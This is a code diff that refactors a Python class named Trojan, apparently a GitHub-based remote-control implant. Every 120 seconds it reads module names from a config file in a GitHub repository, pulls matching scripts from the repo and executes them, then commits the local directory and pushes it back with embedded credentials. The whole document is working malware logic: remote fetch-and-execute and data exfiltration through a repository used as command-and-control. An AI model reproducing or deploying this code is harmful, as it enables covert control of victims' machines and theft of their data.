@@ -3,7 +3,6 @@ import time
 import requests
 import base64
 import importlib
-import importlib.machinery
 import importlib.util
 from git import Repo
 from dotenv import load_dotenv
@@ -21,20 +20,19 @@ class Trojan:
 
     def run(self):
         while True:
-            self.check(self.username, self.repo, "config/config.txt")
-            self.push_git_repo(self.local_dir)
+            self.check("config/config.txt")
+            self.push_git_repo()
             print("Done")
             time.sleep(120)
 
-    def check(self, username, repo, file_path):
-        url = f"https://api.github.com/repos/{username}/{repo}/contents/{file_path}?ref=master"
+    def check(self, file_path):
+        url = f"https://api.github.com/repos/{self.username}/{self.repo}/contents/{file_path}?ref=master"
         headers = {"Authorization": f"Bearer {self.access_token}"}
         response = requests.get(url, headers=headers)
         if response.status_code == 200:
-            file_content = response.json()["content"]
-            decoded_content = base64.b64decode(file_content).decode("utf-8")
+            decoded_content = base64.b64decode(response.json()["content"]).decode("utf-8")
             words = decoded_content.split()
-            if len(words) > 0:
+            if words:
                 for word in words:
                     self.import_module(word.capitalize())
 
@@ -42,26 +40,24 @@ class Trojan:
         try:
             module = importlib.import_module(module_name)
         except ImportError:
-            self.pull_git_repo(self.local_dir)
-            spec = importlib.util.spec_from_file_location(module_name,
-                                                          f"{self.local_dir}/scripts/{module_name.lower()}.py")
+            self.pull_git_repo()
+            spec = importlib.util.spec_from_file_location(module_name, f"{self.local_dir}/scripts/{module_name.lower()}.py")
             module = importlib.util.module_from_spec(spec)
             spec.loader.exec_module(module)
         self.run_module(module)
 
-    def pull_git_repo(self, local_dir):
-        repo = Repo(local_dir)
+    def pull_git_repo(self):
+        repo = Repo(self.local_dir)
         origin = repo.remote("origin")
         origin.fetch()
         origin.pull(repo.active_branch.name)
 
-    def push_git_repo(self, local_dir):
-        repo = Repo(local_dir)
+    def push_git_repo(self):
+        repo = Repo(self.local_dir)
         repo.git.add(".")
         repo.git.commit("-m", "update trojan")
         origin = repo.remote("origin")
-        origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}"
-                       f".git")
+        origin.set_url(f"https://{self.username}:{self.access_token}@github.com/{self.username}/{self.repo}.git")
         origin.push()
 
     def run_module(self, module):
@@ -72,8 +68,7 @@ class Trojan:
 
 
 def main():
-    trojan = Trojan()
-    trojan.run()
+    Trojan().run()
 
 
 if __name__ == '__main__':
